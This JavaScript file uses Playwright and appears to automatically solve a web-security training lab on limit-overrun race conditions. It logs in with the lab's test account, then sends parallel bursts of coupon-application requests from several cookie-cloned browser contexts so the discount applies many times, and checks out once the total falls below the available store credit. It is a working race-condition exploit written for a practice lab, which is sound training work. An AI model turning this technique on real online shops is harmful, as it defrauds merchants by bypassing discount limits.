const { addToCart, checkout, getCsrf, getStoreCredit, isSolved, labLogin, runLab, textContent } = require('./_common.cjs');

const TITLE = 'Limit overrun race conditions';
const PATH = '/web-security/race-conditions/lab-race-conditions-limit-overrun';
const COUPON = 'PROMO20';
const PRODUCT_ID = 1;
const MAX_ATTEMPTS = 6;
const WORKER_COUNT = 4;
const BURST_SIZE = 60;

async function getCartTotal(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await textContent(page);
  const totalLine = body
    .split('\n')
    .map((line) => line.trim())
    .find((line) => /total/i.test(line) && /\$[\d,.]+/.test(line));
  if (totalLine) {
    const amount = totalLine.match(/\$([\d,.]+)/);
    if (amount) return Number(amount[1].replace(/,/g, ''));
  }
  const amounts = [...body.matchAll(/\$([\d,.]+)/g)].map((match) => Number(match[1].replace(/,/g, '')));
  return amounts.length ? amounts[amounts.length - 1] : Number.POSITIVE_INFINITY;
}

async function removeCartAdjustments(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.evaluate(async () => {
    const sent = new Set();

    const fire = async (url, options) => {
      const key = `${options.method || 'GET'} ${url} ${options.body || ''}`;
      if (sent.has(key)) return;
      sent.add(key);
      await fetch(url, { credentials: 'include', ...options }).catch(() => {});
    };

    const forms = [...document.querySelectorAll('form[action]')].filter((form) => {
      const action = (form.getAttribute('action') || '').toLowerCase();
      const text = (form.textContent || '').toLowerCase();
      return /coupon|remove|delete/.test(action) || /remove/.test(text);
    });

    for (const form of forms) {
      const formData = new FormData(form);
      const body = new URLSearchParams();
      for (const [key, value] of formData.entries()) body.append(key, String(value));
      await fire(form.action || location.pathname, {
        method: (form.method || 'POST').toUpperCase(),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      });
    }

    const links = [...document.querySelectorAll('a[href]')].filter((link) => {
      const href = (link.getAttribute('href') || '').toLowerCase();
      const text = (link.textContent || '').toLowerCase();
      return /coupon|remove|delete/.test(href) || /remove/.test(text);
    });

    for (const link of links) {
      await fire(new URL(link.href, location.origin).toString(), { method: 'GET' });
    }
  });
  await page.waitForTimeout(500);
}

async function fireCouponRace(browser, baseContext, primaryPage, labUrl) {
  const cookies = await baseContext.cookies();
  const workers = [{ context: baseContext, page: primaryPage }];

  for (let i = 1; i < WORKER_COUNT; i += 1) {
    const context = await browser.newContext({ viewport: { width: 1440, height: 960 } });
    await context.addCookies(cookies);
    workers.push({ context, page: await context.newPage() });
  }

  try {
    const csrfs = [];
    for (const worker of workers) {
      await worker.page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 30000 });
      csrfs.push(await getCsrf(worker.page));
    }

    await Promise.all(
      workers.map((worker, index) =>
        worker.page.evaluate(async ({ csrf, coupon, burstSize }) => {
          const body = new URLSearchParams();
          if (csrf) body.set('csrf', csrf);
          body.set('coupon', coupon);
          const payload = body.toString();
          await Promise.all(
            Array.from({ length: burstSize }, () =>
              fetch('/cart/coupon', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: payload,
              }).catch(() => null)
            )
          );
        }, { csrf: csrfs[index], coupon: COUPON, burstSize: BURST_SIZE })
      )
    );
  } finally {
    await Promise.all(
      workers
        .slice(1)
        .map(({ context }) => context.close().catch(() => {}))
    );
  }
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ browser, context, page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const storeCredit = await getStoreCredit(page, labUrl);
    await addToCart(page, labUrl, PRODUCT_ID, 1);

    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt += 1) {
      if (attempt > 1) {
        await removeCartAdjustments(page, labUrl);
        await addToCart(page, labUrl, PRODUCT_ID, 1);
      }
      await fireCouponRace(browser, context, page, labUrl);
      await page.waitForTimeout(5000);
      const total = await getCartTotal(page, labUrl);

      console.log(`attempt ${attempt}: workers=${WORKER_COUNT} burst=${BURST_SIZE} total=$${Number.isFinite(total) ? total : 'unknown'} credit=$${storeCredit}`);

      if (Number.isFinite(total) && total < storeCredit) {
        await checkout(page, labUrl);
        if (await isSolved(page, labUrl)) return;
      }
    }

    throw new Error('Unable to reduce jacket total below available credit');
  },
});
